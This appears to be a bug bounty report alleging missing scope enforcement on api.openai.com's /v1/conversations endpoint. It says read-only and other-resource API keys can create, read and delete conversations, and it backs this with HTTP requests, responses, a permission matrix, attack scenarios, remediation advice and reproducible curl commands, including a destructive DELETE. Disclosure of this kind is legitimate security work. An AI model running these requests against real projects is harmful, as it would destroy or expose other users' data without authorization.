# [Broken Access Control] > [Privilege Escalation] > P2

## Read-Only API Key Performs Destructive DELETE on /v1/conversations Scope Enforcement Absent

**VRT Category:** Broken Access Control > Privilege Escalation  
**Target:** api.openai.com  
**CVSS 3.1:** 7.1 (High) AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L  

---

## Summary

A project-scoped API key configured with **Read-Only** permissions on a single resource type (Models) can **create, read, and delete** conversations via `/v1/conversations` — a completely different resource it was never granted access to. This is not a permission hierarchy design choice; this is a missing authorization middleware on an entire API endpoint.

---

## Steps to Reproduce

**Environment:**
- All keys are project-scoped (`sk-proj-...`) from the same OpenAI project
- `MODELS_READ_KEY` — Models:Read only (most restricted key possible)
- `ALL_WRITE_KEY` — All permissions, Write scope (for victim data creation)
- No admin access required — normal project settings

---

### Step 1: Create a conversation using the full-access key (victim's data)

```http
POST /v1/conversations HTTP/1.1
Host: api.openai.com
Authorization: Bearer ALL_WRITE_KEY
Content-Type: application/json

{"metadata": {"note": "sensitive_training_data", "owner": "victim"}}
```

**Response (200 OK):**
```json
{
  "id": "conv_6a391904fa0881959e29bbe877b0a89e0b9f20d6673d9ef6",
  "object": "conversation",
  "created_at": 1782126852,
  "metadata": {"note": "sensitive_training_data", "owner": "victim"}
}
```

---

### Step 2: Delete it using the Models:Read key (BAC — destructive write)

```http
DELETE /v1/conversations/conv_6a391904fa0881959e29bbe877b0a89e0b9f20d6673d9ef6 HTTP/1.1
Host: api.openai.com
Authorization: Bearer MODELS_READ_KEY
```

**Expected:** `403 Forbidden` — key has Models:Read scope, not Conversations:Write  
**Actual (200 OK — DATA DELETED):**
```json
{
  "id": "conv_6a391904fa0881959e29bbe877b0a89e0b9f20d6673d9ef6",
  "object": "conversation.deleted",
  "deleted": true
}
```

**A read-only key deleted another key's conversation.**

---

### Step 3: Read-Only key also creates conversations (write operation)

```http
POST /v1/conversations HTTP/1.1
Host: api.openai.com
Authorization: Bearer MODELS_READ_KEY
Content-Type: application/json

{"metadata": {"created_by": "read_only_key"}}
```

**Response (200 OK):**
```json
{
  "id": "conv_6a39190749ac8193be576654e0183e270b17e919fa3e4d42",
  "object": "conversation",
  "created_at": 1782126855,
  "metadata": {"created_by": "read_only_key"}
}
```

---

### Step 4: Files:Write key reads another key's conversation (cross-resource access)

```http
GET /v1/conversations/conv_6a391904fa0881959e29bbe877b0a89e0b9f20d6673d9ef6 HTTP/1.1
Host: api.openai.com
Authorization: Bearer FILES_WRITE_KEY
```

**Expected:** `403 Forbidden` — Files scope ≠ Conversations scope  
**Actual (200 OK):**
```json
{
  "id": "conv_6a391904fa0881959e29bbe877b0a89e0b9f20d6673d9ef6",
  "object": "conversation",
  "created_at": 1782126852,
  "metadata": {"note": "sensitive_training_data", "owner": "victim"}
}
```

---

## Scope Enforcement Matrix (All Tested Live)

| Key Type | Configured Scope | POST /conversations | GET /conversations/{id} | DELETE /conversations/{id} |
|----------|-----------------|--------------------|-----------------------|--------------------------|
| `all:write` | All → Write | 200 (expected) | 200 (expected) | 200 (expected) |
| `all:read` | All → Read | **200 — BAC** | **200 — BAC** | **200 — BAC** |
| `files:write` | Files → Write only | **200 — BAC** | **200 — BAC** | **200 — BAC** |
| `models:read` | Models → Read only | **200 — BAC** | **200 — BAC** | **200 — BAC** |
| `threads:write` | Threads → Write only | **200 — BAC** | **200 — BAC** | **200 — BAC** |
| **Expected** | | write scope only | read scope only | write scope only |

**Every key tested gets full CRUD on `/v1/conversations` regardless of configured permissions.**

---

## Expected vs Actual

| Operation | Key Type | Expected | Actual |
|-----------|----------|----------|--------|
| POST /v1/conversations | Models:Read | 403 Forbidden | **200 OK** |
| GET /v1/conversations/{id} | Models:Read | 403 Forbidden | **200 OK** |
| DELETE /v1/conversations/{id} | Models:Read | 403 Forbidden | **200 OK — DATA DELETED** |
| POST /v1/conversations | Files:Write | 403 Forbidden | **200 OK** |
| GET /v1/conversations/{id} | Files:Write | 403 Forbidden | **200 OK** |
| DELETE /v1/conversations/{id} | Files:Write | 403 Forbidden | **200 OK** |

---

## Impact

**Severity: P2 High (CVSS 7.1)**

### Direct Impact
A project member with the most restricted key possible (`Models:Read` — intended only for listing models) can:
- **Delete every conversation** in the project (data destruction)
- **Read all conversations** including sensitive training data, prompts, and responses
- **Create new conversations** (resource pollution)

### Attack Scenarios

**Scenario 1: Insider Threat / Contractor Abuse**
A developer shares a `Models:Read` key with a contractor for analytics access. The contractor deletes all project conversations before engagement ends. Recovery may not be possible.

**Scenario 2: Compromised Key Lateral Movement**
If a `Files:Write` key leaks (e.g., via a vulnerable file upload service or CI/CD log), the attacker gains full CRUD access to Conversations — a completely different resource they were never authorized to reach. This expands a medium-severity key compromise into a high-severity data breach.

**Scenario 3: Automated Wipe**
An attacker can script deletion of all conversations in a project with a simple loop — no authentication escalation required.

---

## Remediation

Add authorization middleware to `/v1/conversations` and `/v1/conversations/{id}`:

1. **POST** — require `api.conversations.write` scope
2. **GET** — require `api.conversations.read` scope  
3. **DELETE** — require `api.conversations.write` scope
4. Keys scoped to other resource types (files, models, threads) must receive `403 Forbidden`

---

## Supporting curl Commands

```bash
# Set your keys
MODELS_READ_KEY="sk-proj-<your-models-read-key>"
ALL_WRITE_KEY="sk-proj-<your-all-write-key>"

# Step 1: Create conversation (victim data)
curl -s -X POST https://api.openai.com/v1/conversations \
  -H "Authorization: Bearer $ALL_WRITE_KEY" \
  -H "Content-Type: application/json" \
  -d '{"metadata":{"note":"sensitive_data","owner":"victim"}}'

# Step 2: Delete with read-only key (BAC)
curl -s -X DELETE https://api.openai.com/v1/conversations/<CONV_ID> \
  -H "Authorization: Bearer $MODELS_READ_KEY"

# Step 3: Create with read-only key (BAC)
curl -s -X POST https://api.openai.com/v1/conversations \
  -H "Authorization: Bearer $MODELS_READ_KEY" \
  -H "Content-Type: application/json" \
  -d '{"metadata":{"created_by":"read_only_key"}}'

# Step 4: Read with Files:Write key (cross-resource BAC)
curl -s https://api.openai.com/v1/conversations/<CONV_ID> \
  -H "Authorization: Bearer $FILES_WRITE_KEY"
```
